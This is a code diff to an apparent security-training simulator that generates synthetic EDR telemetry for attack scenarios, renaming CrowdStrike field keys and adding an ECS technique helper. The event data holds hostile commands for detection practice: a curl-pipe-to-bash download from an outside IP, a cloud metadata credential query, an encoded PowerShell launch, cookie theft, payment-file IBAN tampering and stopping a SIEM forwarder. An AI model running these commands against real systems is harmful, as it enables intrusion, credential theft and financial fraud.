@@ -96,6 +96,7 @@ import { AI_FOUNDATION_STORIES } from "./ai-stories/foundation";
 import { AI_ADVANCED_A_STORIES } from "./ai-stories/advanced-a";
 import { aiLlmJackingScenarioEvents } from "@/lib/sim/scenario-packs/aiLlmJacking.events";
 import type { TelemetryEvent } from "@/lib/sim/types";
+import { ecsTechnique } from "@/lib/logs/ecsFields";
 
 /**
  * Real difficulty for STORY SELECTION — how simple the attack itself is for a
@@ -410,7 +411,7 @@ const QB_SWIFT_WIRE_FRAUD: TelemetryEvent[] = [
     process: { name: "powershell.exe", pid: 4471, parent_name: "WINWORD.EXE", parent_pid: 3391, user: "p.meier",
                cmdline: "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand JABXAGUAYgBDAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
                hash: { sha256: "8e403075db91e11c687fdffe710359d0e04e989f53ac9ac8d005d08130cc23c2" } },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand JABXAGUAYgBDAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==", "crowdstrike.FileName": "powershell.exe", "crowdstrike.FilePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\", "crowdstrike.ParentProcessName": "WINWORD.EXE", "crowdstrike.UserName": "p.meier", "crowdstrike.SeverityName": "MEDIUM", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand JABXAGUAYgBDAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==", "crowdstrike.FileName": "powershell.exe", "crowdstrike.FilePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\", "crowdstrike.ParentBaseFileName": "WINWORD.EXE", "crowdstrike.UserName": "p.meier", "crowdstrike.SeverityName": "MEDIUM", "action_result": "allowed" }
   },
   {
     id: "qbwf2", ts: "2026-06-15T07:52:00.000Z", source: "firewall", event_type: "net_connection",
@@ -428,7 +429,7 @@ const QB_SWIFT_WIRE_FRAUD: TelemetryEvent[] = [
                path: "C:\\Users\\p.meier\\AppData\\Local\\Temp\\chrome_update.exe",
                cmdline: "chrome_update.exe --dump-cookies --target=okta.quantumbank.ch",
                hash: { sha256: "a49ceab6f3029571559ee60319170fe21e15db8e866114bc7f67b04031a32d6b" } },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "chrome_update.exe --dump-cookies --target=okta.quantumbank.ch", "crowdstrike.FileName": "chrome_update.exe", "crowdstrike.FilePath": "C:\\Users\\p.meier\\AppData\\Local\\Temp\\", "crowdstrike.ParentProcessName": "powershell.exe", "crowdstrike.UserName": "p.meier", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "chrome_update.exe --dump-cookies --target=okta.quantumbank.ch", "crowdstrike.FileName": "chrome_update.exe", "crowdstrike.FilePath": "C:\\Users\\p.meier\\AppData\\Local\\Temp\\", "crowdstrike.ParentBaseFileName": "powershell.exe", "crowdstrike.UserName": "p.meier", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
   },
   {
     id: "qbwf4", ts: "2026-06-15T08:04:00.000Z", source: "okta", event_type: "auth_success",
@@ -451,7 +452,7 @@ const QB_SWIFT_WIRE_FRAUD: TelemetryEvent[] = [
     mitre_technique: "T1565.001", mitre_tactic: "Impact",
     process: { name: "powershell.exe", pid: 7711, parent_name: "cmd.exe", parent_pid: 7700, user: "svc-swift-app",
                cmdline: "powershell.exe -Command \"(Get-Content C:\\SWIFT\\Outbound\\PaymentBatch_20260615.xml) -replace 'BENEFICIARY_IBAN','LT121000011101001000' | Set-Content C:\\SWIFT\\Outbound\\PaymentBatch_20260615.xml\"" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -Command \"(Get-Content C:\\SWIFT\\Outbound\\PaymentBatch_20260615.xml) -replace 'BENEFICIARY_IBAN','LT121000011101001000' | Set-Content C:\\SWIFT\\Outbound\\PaymentBatch_20260615.xml\"", "crowdstrike.FileName": "powershell.exe", "crowdstrike.ParentProcessName": "cmd.exe", "crowdstrike.UserName": "svc-swift-app", "crowdstrike.SeverityName": "CRITICAL", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -Command \"(Get-Content C:\\SWIFT\\Outbound\\PaymentBatch_20260615.xml) -replace 'BENEFICIARY_IBAN','LT121000011101001000' | Set-Content C:\\SWIFT\\Outbound\\PaymentBatch_20260615.xml\"", "crowdstrike.FileName": "powershell.exe", "crowdstrike.ParentBaseFileName": "cmd.exe", "crowdstrike.UserName": "svc-swift-app", "crowdstrike.SeverityName": "CRITICAL", "action_result": "allowed" }
   },
   {
     id: "qbwf7", ts: "2026-06-15T08:20:00.000Z", source: "proxy", event_type: "http_request",
@@ -538,7 +539,7 @@ const QB_FRAUD_MONITORING_TAMPERING: TelemetryEvent[] = [
     description: "Running as svc-fraud-monitor on SRV-QB-ADMIN01, PowerShell stopped the local SIEM forwarder service",
     mitre_technique: "T1562.001", mitre_tactic: "Defense Evasion",
     process: { name: "powershell.exe", pid: 8802, parent_name: "cmd.exe", parent_pid: 8800, user: "svc-fraud-monitor", cmdline: "powershell.exe -Command \"Stop-Service -Name SplunkForwarder -Force\"" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -Command \"Stop-Service -Name SplunkForwarder -Force\"", "crowdstrike.FileName": "powershell.exe", "crowdstrike.ParentProcessName": "cmd.exe", "crowdstrike.UserName": "svc-fraud-monitor", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -Command \"Stop-Service -Name SplunkForwarder -Force\"", "crowdstrike.FileName": "powershell.exe", "crowdstrike.ParentBaseFileName": "cmd.exe", "crowdstrike.UserName": "svc-fraud-monitor", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
   },
   {
     id: "qbft6", ts: "2026-06-20T22:40:00.000Z", source: "proxy", event_type: "http_request",
@@ -560,7 +561,7 @@ const QB_FRAUD_MONITORING_TAMPERING: TelemetryEvent[] = [
     description: "The SIEM forwarder service was restarted on SRV-QB-ADMIN01 moments after the alarm threshold was restored",
     mitre_technique: "T1070", mitre_tactic: "Defense Evasion",
     process: { name: "powershell.exe", pid: 8830, parent_name: "cmd.exe", parent_pid: 8800, user: "svc-fraud-monitor", cmdline: "powershell.exe -Command \"Start-Service -Name SplunkForwarder\"" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -Command \"Start-Service -Name SplunkForwarder\"", "crowdstrike.FileName": "powershell.exe", "crowdstrike.ParentProcessName": "cmd.exe", "crowdstrike.UserName": "svc-fraud-monitor", "crowdstrike.SeverityName": "MEDIUM", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -Command \"Start-Service -Name SplunkForwarder\"", "crowdstrike.FileName": "powershell.exe", "crowdstrike.ParentBaseFileName": "cmd.exe", "crowdstrike.UserName": "svc-fraud-monitor", "crowdstrike.SeverityName": "MEDIUM", "action_result": "allowed" }
   },
   {
     id: "qbft9", ts: "2026-06-20T22:58:00.000Z", source: "iam", event_type: "privileged_operation",
@@ -662,7 +663,7 @@ const RS_CICD_PIPELINE_POISONING: TelemetryEvent[] = [
     description: "The workflow step executed a curl-pipe-to-bash one-liner on SRV-PROD-001 as the ci-pipeline user",
     mitre_technique: "T1059.004", mitre_tactic: "Execution",
     process: { name: "bash", pid: 41210, parent_name: "sh", parent_pid: 41200, user: "ci-pipeline", cmdline: "curl -sSL http://185.220.101.42/bootstrap.sh | bash" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "curl -sSL http://185.220.101.42/bootstrap.sh | bash", "crowdstrike.FileName": "bash", "crowdstrike.ParentProcessName": "sh", "crowdstrike.UserName": "ci-pipeline", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "curl -sSL http://185.220.101.42/bootstrap.sh | bash", "crowdstrike.FileName": "bash", "crowdstrike.ParentBaseFileName": "sh", "crowdstrike.UserName": "ci-pipeline", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
   },
   {
     id: "rscp4", ts: "2026-06-18T09:05:10.000Z", source: "edr", event_type: "process_create",
@@ -670,7 +671,7 @@ const RS_CICD_PIPELINE_POISONING: TelemetryEvent[] = [
     description: "bootstrap.sh queried the EC2 instance metadata service for the attached IAM role's temporary credentials",
     mitre_technique: "T1552.005", mitre_tactic: "Credential Access",
     process: { name: "curl", pid: 41230, parent_name: "bash", parent_pid: 41210, user: "ci-pipeline", cmdline: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/rocketstack-ci-deploy-role" },
-    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/rocketstack-ci-deploy-role", "crowdstrike.FileName": "curl", "crowdstrike.ParentProcessName": "bash", "crowdstrike.UserName": "ci-pipeline", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
+    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/rocketstack-ci-deploy-role", "crowdstrike.FileName": "curl", "crowdstrike.ParentBaseFileName": "bash", "crowdstrike.UserName": "ci-pipeline", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
   },
   {
     id: "rscp5", ts: "2026-06-18T09:07:00.000Z", source: "cloudtrail", event_type: "cloud_api_call",
@@ -1219,7 +1220,6 @@ function reshapeEdrRaw(e: TelemetryEvent, target: EdrNs): Record<string, unknown
       : et === "registry_set" ? "AsepValueUpdate"
       : et === "file_create" || et === "file_modify" ? "NewExecutableWritten"
       : "ProcessRollup2";
-    if (isDetection && e.mitre_technique) block["crowdstrike.detection.technique_id"] = e.mitre_technique;
     if (e.severity) block["crowdstrike.SeverityName"] = e.severity.toUpperCase();
   } else if (target === "s1") {
     // Authentic SentinelOne Deep Visibility / threatInfo schema (no invented flat keys).
@@ -1249,7 +1249,7 @@ function reshapeEdrRaw(e: TelemetryEvent, target: EdrNs): Record<string, unknown
     if (e.hostname) block["DeviceName"] = e.hostname.toLowerCase();
     if (isDetection) {
       block["mde.AlertTitle"] = String(src["threat.name"] ?? src["malware.name"] ?? "") || "Suspicious activity detected";
-      if (e.mitre_technique) block["threat.technique.id"] = e.mitre_technique;
+      Object.assign(block, ecsTechnique(e.mitre_technique));
     }
   }
   // The authored vendor's keys carried the evidence; where the target EDR has no native
@@ -1264,7 +1264,7 @@ function reshapeEdrRaw(e: TelemetryEvent, target: EdrNs): Record<string, unknown
   put("file.path", e.file?.path); put("file.hash.sha256", e.file?.sha256); put("file.size", e.file?.size);
   put("url.full", e.network?.url); put("destination.ip", e.dst_ip); put("destination.port", e.dst_port);
   put("registry.path", e.registry?.path); put("registry.value", e.registry?.value);
-  if (e.mitre_technique) put("threat.technique.id", e.mitre_technique);
+  for (const [k, v] of Object.entries(ecsTechnique(e.mitre_technique))) put(k, v);
   return { ...block, ...ecs, ...neutral };
 }
 
@@ -1424,7 +1424,7 @@ export function instantiateStory(s: AttackStory, companyPool: TelemetryEvent[], 
   const isDcHost = (h: string) => (assets && h === assets.dc) || /(^|[^a-z0-9])dc[-_]?\d*([^a-z]|$)/i.test(h);
   // A machine the story shows running Linux (auditd, unix paths) is a server, never a workstation.
   // A Mac also runs /usr/bin binaries (osascript, curl) — a host any row shows as macOS is a laptop, not a server.
-  const macHosts = new Set(s.events.filter(e => e.hostname && (/darwin|^mac/i.test(String(e.raw?.["host.os.family"] ?? e.raw?.["crowdstrike.platform"] ?? "")) || /^\/(Applications|Users|Volumes|System|Library)\//.test(e.process?.path ?? e.file?.path ?? ""))).map(e => e.hostname!));
+  const macHosts = new Set(s.events.filter(e => e.hostname && (/darwin|^mac/i.test(String(e.raw?.["host.os.family"] ?? e.raw?.["crowdstrike.event_platform"] ?? "")) || /^\/(Applications|Users|Volumes|System|Library)\//.test(e.process?.path ?? e.file?.path ?? ""))).map(e => e.hostname!));
   const linuxHosts = new Set(s.events.filter(e => e.hostname && !macHosts.has(e.hostname) && (e.source === "linux_audit" || /^\/(usr|bin|sbin|etc|home|opt|var|tmp)\//.test(e.process?.path ?? ""))).map(e => e.hostname!));
   const isServerHost = (h: string) => !isDcHost(h) && (
     (assets ? h === assets.fileServer : false) ||
